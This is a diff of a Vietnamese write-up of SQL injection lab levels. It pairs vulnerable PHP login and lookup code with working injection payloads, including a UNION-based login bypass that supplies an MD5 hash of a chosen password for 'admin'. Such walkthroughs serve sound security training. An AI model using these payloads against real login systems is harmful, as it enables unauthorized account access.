@@ -475,6 +475,11 @@ select * from users;
 ```
 ![image](https://github.com/user-attachments/assets/efafadf4-53cc-4a06-a857-a3147240b04e)
 
+
+![image](https://github.com/user-attachments/assets/defc8e9a-2f4c-4aa8-b333-30003824b5cf)
+
+![image](https://github.com/user-attachments/assets/ed5863d6-0220-46cd-838c-602d2b6a1596)
+
 ## Basic
 ### LV1:
 - LV này thì mình ko đọc source mình sql đại:)))
@@ -557,6 +562,80 @@ function loginHandler($username, $password)
     - Password: `) UNION SELECT username from users-- `
 
 ### LV5
-![image](https://github.com/user-attachments/assets/defc8e9a-2f4c-4aa8-b333-30003824b5cf)
+```php
+{
+	try {
+		include("db.php");
+		$database = make_connection("hashed_db");
 
-![image](https://github.com/user-attachments/assets/ed5863d6-0220-46cd-838c-602d2b6a1596)
+		$sql = "SELECT username, password FROM users WHERE username='$username'";
+		$query = $database->query($sql);
+		$row = $query->fetch_assoc(); // Get the first row
+```
+- Ở đây ta chỉ cần để ý truy vấn cũng như `$row = $query->fetch_assoc(); // Get the first row` hàm này sẽ chỉ cho phép ta hiện thị được 1 dòng khi select.
+
+- Với `union` thì ta có thể thao tác thay đổi pass hay chèn thêm các user vào.
+- Tuy nhiên với bài này thì mình sẽ thay đổi pass của `admin` r dùng pass đó để login.
+
+```sql
+abc' UNION SELECT 'admin', MD5('abc') -- 
+```
+- Pass: `abc`.
+
+![image](https://github.com/user-attachments/assets/330b7cfd-ea4d-4fbc-bd58-fbf6ac306089)
+
+### LV6
+```php
+<?php
+if (isset($_GET["id"])) {
+    try {
+        include("db.php");
+        $database = make_connection("posts_db");
+
+        $id = $database->real_escape_string($_GET["id"]);
+        $sql = "SELECT content FROM posts WHERE id=$id";
+        $query = $database->query($sql);
+        $row = $query->fetch_assoc(); // Get the first row
+```
+
+-  Đọc sơ thì ta thấy 1 vài hàm như là `real_escape_string(` hàm này loại bỏ các ký tự đặc biệt (như: **NULL , \n, \r, \, “, ", Control-Z**) trong chuỗi `id`.
+- Tương tự chall trên thì ta cx lại có `$row = $query->fetch_assoc(); // Get the first row`.
+- H ta thử phá thoi:)))
+- Nếu nhập id ko có thì not found điều này khá hiển nhiên. Tuy nhiên ta thử chèn sql vào xem nó có hoạt động ko:))
+
+![image](https://github.com/user-attachments/assets/d4f0742b-8d5b-4be6-bb67-a9df84686aa0)
+- Quên ko đọc đề nên mình ngồi mò mãi chả bt nó chỉ yêu cầu mình check version:))
+
+![image](https://github.com/user-attachments/assets/78e287ac-6336-40fc-a53e-14afecbc24a8)
+
+### LV7
+
+```php
+<?php
+session_start();
+if (isset($_POST["username"]) && isset($_POST["password"])) {
+    try {
+        include("header.php");
+        $database = make_connection("advanced_db");
+
+        $sql = "SELECT username FROM users WHERE username=? and password=?";
+        $statement = $database->prepare($sql);
+        $statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
+        $statement->execute();
+        $statement->store_result();
+        $statement->bind_result($result);
+
+        if ($statement->num_rows > 0) {
+            $statement->fetch();
+            $_SESSION["username"] = $result;
+            die(header("Location: profile.php"));
+        } else {
+            $message = "Wrong username or password";
+        }
+    } catch (mysqli_sql_exception $e) {
+        $message = $e->getMessage();
+    }   
+}
+
+include("../basic/static/html/second-order.html");
+```
